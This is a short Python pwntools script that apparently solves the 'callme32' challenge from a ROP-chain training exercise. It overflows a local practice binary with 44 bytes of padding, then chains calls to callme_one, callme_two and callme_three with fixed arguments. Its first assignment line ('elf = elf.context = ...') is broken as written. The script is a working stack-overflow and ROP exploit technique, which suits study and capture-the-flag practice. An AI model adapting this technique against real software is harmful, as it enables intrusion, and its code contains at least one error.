#!/usr/bin/env python3

from pwn import *

elf = elf.context = ELF('callme32')
p = process(elf.path)

pop_esi_edi_ebp_ret = 0x080487f9
parameters = p32(0xdeadbeef)
parameters += p32(0xcafebabe)
parameters += p32(0xd00df00d)


rop = ROP(elf)
rop.raw(elf.symbols['callme_one'])
rop.raw(pop_esi_edi_ebp_ret)
rop.raw(parameters)

rop.raw(elf.symbols['callme_two'])
rop.raw(pop_esi_edi_ebp_ret)
rop.raw(parameters)

rop.raw(elf.symbols['callme_three'])
rop.raw(pop_esi_edi_ebp_ret)
rop.raw(parameters)

print(rop.dump())

xpl = flat(
	b'A' * 44,
	rop.chain()
)

with open('payload', 'wb') as file:
	file.write(xpl)

p.sendline(xpl)
p.interactive()
